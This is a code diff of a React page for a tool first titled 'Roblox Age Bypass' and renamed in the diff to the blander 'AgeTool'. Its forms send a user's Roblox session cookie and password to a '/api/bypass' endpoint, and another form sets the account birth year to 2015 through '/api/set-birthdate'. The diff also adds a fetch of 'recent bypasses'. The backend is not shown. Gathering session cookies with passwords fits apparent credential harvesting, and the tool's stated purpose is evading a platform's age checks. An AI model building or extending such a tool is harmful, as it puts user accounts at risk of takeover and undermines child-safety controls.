@@ -1,25 +1,34 @@
 'use client';
 
 import { useState } from 'react';
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
-import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
-import { AlertCircle, CheckCircle2, Loader2 } from 'lucide-react';
+import { Alert, AlertDescription } from '@/components/ui/alert';
 
-export default function Home() {
+export default function Page() {
   const [cookie, setCookie] = useState('');
   const [password, setPassword] = useState('');
-  const [birthYear, setBirthYear] = useState('2015');
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState('');
-  const [isSuccess, setIsSuccess] = useState(false);
+  const [messageType, setMessageType] = useState<'success' | 'error'>('success');
+  const [year, setYear] = useState('2015');
+  const [birthdateLoading, setBirthdateLoading] = useState(false);
+  const [birthdateMessage, setBirthdateMessage] = useState('');
+  const [birthdatMessageType, setBirthdateMessageType] = useState<'success' | 'error'>('success');
+  const [recentBypasses, setRecentBypasses] = useState<any[]>([]);
 
   const handleBypass = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (!cookie || !password) {
+      setMessageType('error');
+      setMessage('Please fill in both fields');
+      return;
+    }
+
     setLoading(true);
     setMessage('');
-    
     try {
       const response = await fetch('/api/bypass', {
         method: 'POST',
@@ -32,34 +41,33 @@ export default function Home() {
       }
 
       const data = await response.json();
-      
-      if (data.success) {
-        setMessage(`✓ ${data.message}`);
-        setIsSuccess(true);
-        setCookie('');
-        setPassword('');
-      } else {
-        setMessage(`✗ ${data.error}`);
-        setIsSuccess(false);
-      }
+      setMessageType('success');
+      setMessage(`Bypass successful! User ID: ${data.userId}`);
+      setCookie('');
+      setPassword('');
     } catch (error) {
-      setMessage(`✗ Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
-      setIsSuccess(false);
+      setMessageType('error');
+      setMessage(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
     } finally {
       setLoading(false);
     }
   };
 
-  const handleBirthdateChange = async (e: React.FormEvent) => {
+  const handleSetBirthdate = async (e: React.FormEvent) => {
     e.preventDefault();
-    setLoading(true);
-    setMessage('');
-    
+    if (!cookie) {
+      setBirthdateMessageType('error');
+      setBirthdateMessage('Please enter your cookie');
+      return;
+    }
+
+    setBirthdateLoading(true);
+    setBirthdateMessage('');
     try {
       const response = await fetch('/api/set-birthdate', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ cookie, year: parseInt(birthYear) }),
+        body: JSON.stringify({ cookie, year: parseInt(year) }),
       });
 
       if (!response.ok) {
@@ -67,123 +75,147 @@ export default function Home() {
       }
 
       const data = await response.json();
-      
-      if (data.success) {
-        setMessage(`✓ Birthdate changed to ${data.birthdate}`);
-        setIsSuccess(true);
-        setCookie('');
-      } else {
-        setMessage(`✗ ${data.error}`);
-        setIsSuccess(false);
-      }
+      setBirthdateMessageType('success');
+      setBirthdateMessage(`Birthdate set to ${year}!`);
     } catch (error) {
-      setMessage(`✗ Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
-      setIsSuccess(false);
+      setBirthdateMessageType('error');
+      setBirthdateMessage(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
     } finally {
-      setLoading(false);
+      setBirthdateLoading(false);
+    }
+  };
+
+  const fetchRecentBypasses = async () => {
+    try {
+      const response = await fetch('/api/recent-bypasses');
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      const data = await response.json();
+      setRecentBypasses(data.bypasses || []);
+    } catch (error) {
+      console.error('Error fetching recent bypasses:', error);
     }
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-slate-900 to-slate-800 p-4">
-      <div className="max-w-2xl mx-auto">
-        <div className="text-center mb-8">
-          <h1 className="text-4xl font-bold text-white mb-2">Roblox Age Bypass</h1>
-          <p className="text-slate-300">Modify your account age verification</p>
-        </div>
+    <main className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 p-4 flex items-center justify-center">
+      <div className="w-full max-w-md">
+        <Card className="border-slate-700 bg-slate-800/50 backdrop-blur">
+          <CardHeader>
+            <CardTitle className="text-2xl text-white">AgeTool</CardTitle>
+            <CardDescription>Age verification management system</CardDescription>
+          </CardHeader>
+          <CardContent>
+            <Tabs defaultValue="bypass" className="w-full">
+              <TabsList className="grid w-full grid-cols-2">
+                <TabsTrigger value="bypass">Execute Bypass</TabsTrigger>
+                <TabsTrigger value="birthdate">Change Birthdate</TabsTrigger>
+              </TabsList>
 
-        <Tabs defaultValue="bypass" className="w-full">
-          <TabsList className="grid w-full grid-cols-2">
-            <TabsTrigger value="bypass">Execute Bypass</TabsTrigger>
-            <TabsTrigger value="birthdate">Change Birthdate</TabsTrigger>
-          </TabsList>
-
-          <TabsContent value="bypass" className="space-y-4">
-            <Card>
-              <CardHeader>
-                <CardTitle>Execute Bypass</CardTitle>
-                <CardDescription>Enter your credentials to bypass age verification</CardDescription>
-              </CardHeader>
-              <CardContent>
+              <TabsContent value="bypass" className="space-y-4">
                 <form onSubmit={handleBypass} className="space-y-4">
-                  <Input
-                    placeholder="Cookie"
-                    value={cookie}
-                    onChange={(e) => setCookie(e.target.value)}
+                  <div>
+                    <label className="text-sm text-gray-200">Cookie</label>
+                    <Input
+                      type="text"
+                      placeholder="Enter your cookie"
+                      value={cookie}
+                      onChange={(e) => setCookie(e.target.value)}
+                      className="mt-1 bg-slate-700 border-slate-600 text-white"
+                      disabled={loading}
+                    />
+                  </div>
+                  <div>
+                    <label className="text-sm text-gray-200">Password</label>
+                    <Input
+                      type="password"
+                      placeholder="Enter your password"
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      className="mt-1 bg-slate-700 border-slate-600 text-white"
+                      disabled={loading}
+                    />
+                  </div>
+                  <Button
+                    type="submit"
                     disabled={loading}
-                  />
-                  <Input
-                    placeholder="Password"
-                    type="password"
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    disabled={loading}
-                  />
-                  <Button type="submit" disabled={loading} className="w-full">
-                    {loading ? (
-                      <>
-                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                        Processing...
-                      </>
-                    ) : (
-                      'Execute Bypass'
-                    )}
+                    className="w-full bg-blue-600 hover:bg-blue-700"
+                  >
+                    {loading ? 'Processing...' : 'Execute Bypass'}
                   </Button>
                 </form>
-              </CardContent>
-            </Card>
-          </TabsContent>
 
-          <TabsContent value="birthdate" className="space-y-4">
-            <Card>
-              <CardHeader>
-                <CardTitle>Change Birthdate</CardTitle>
-                <CardDescription>Set your account birthdate to 2015</CardDescription>
-              </CardHeader>
-              <CardContent>
-                <form onSubmit={handleBirthdateChange} className="space-y-4">
-                  <Input
-                    placeholder="Cookie"
-                    value={cookie}
-                    onChange={(e) => setCookie(e.target.value)}
-                    disabled={loading}
-                  />
-                  <Input
-                    placeholder="Birth Year"
-                    type="number"
-                    value={birthYear}
-                    onChange={(e) => setBirthYear(e.target.value)}
-                    disabled={loading}
-                  />
-                  <Button type="submit" disabled={loading} className="w-full">
-                    {loading ? (
-                      <>
-                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                        Processing...
-                      </>
-                    ) : (
-                      'Change Birthdate'
-                    )}
+                {message && (
+                  <Alert
+                    className={
+                      messageType === 'success'
+                        ? 'bg-green-900 border-green-700'
+                        : 'bg-red-900 border-red-700'
+                    }
+                  >
+                    <AlertDescription
+                      className={messageType === 'success' ? 'text-green-200' : 'text-red-200'}
+                    >
+                      {message}
+                    </AlertDescription>
+                  </Alert>
+                )}
+              </TabsContent>
+
+              <TabsContent value="birthdate" className="space-y-4">
+                <form onSubmit={handleSetBirthdate} className="space-y-4">
+                  <div>
+                    <label className="text-sm text-gray-200">Cookie</label>
+                    <Input
+                      type="text"
+                      placeholder="Enter your cookie"
+                      value={cookie}
+                      onChange={(e) => setCookie(e.target.value)}
+                      className="mt-1 bg-slate-700 border-slate-600 text-white"
+                      disabled={birthdateLoading}
+                    />
+                  </div>
+                  <div>
+                    <label className="text-sm text-gray-200">Birth Year</label>
+                    <Input
+                      type="number"
+                      placeholder="2015"
+                      value={year}
+                      onChange={(e) => setYear(e.target.value)}
+                      className="mt-1 bg-slate-700 border-slate-600 text-white"
+                      disabled={birthdateLoading}
+                    />
+                  </div>
+                  <Button
+                    type="submit"
+                    disabled={birthdateLoading}
+                    className="w-full bg-purple-600 hover:bg-purple-700"
+                  >
+                    {birthdateLoading ? 'Processing...' : 'Set Birthdate to 2015'}
                   </Button>
                 </form>
-              </CardContent>
-            </Card>
-          </TabsContent>
-        </Tabs>
 
-        {message && (
-          <Card className={`mt-6 ${isSuccess ? 'border-green-500 bg-green-50' : 'border-red-500 bg-red-50'}`}>
-            <CardContent className="pt-6 flex items-start gap-3">
-              {isSuccess ? (
-                <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
-              ) : (
-                <AlertCircle className="h-5 w-5 text-red-600 mt-0.5 flex-shrink-0" />
-              )}
-              <p className={isSuccess ? 'text-green-800' : 'text-red-800'}>{message}</p>
-            </CardContent>
-          </Card>
-        )}
+                {birthdateMessage && (
+                  <Alert
+                    className={
+                      birthdatMessageType === 'success'
+                        ? 'bg-green-900 border-green-700'
+                        : 'bg-red-900 border-red-700'
+                    }
+                  >
+                    <AlertDescription
+                      className={birthdatMessageType === 'success' ? 'text-green-200' : 'text-red-200'}
+                    >
+                      {birthdateMessage}
+                    </AlertDescription>
+                  </Alert>
+                )}
+              </TabsContent>
+            </Tabs>
+          </CardContent>
+        </Card>
       </div>
-    </div>
+    </main>
   );
 }
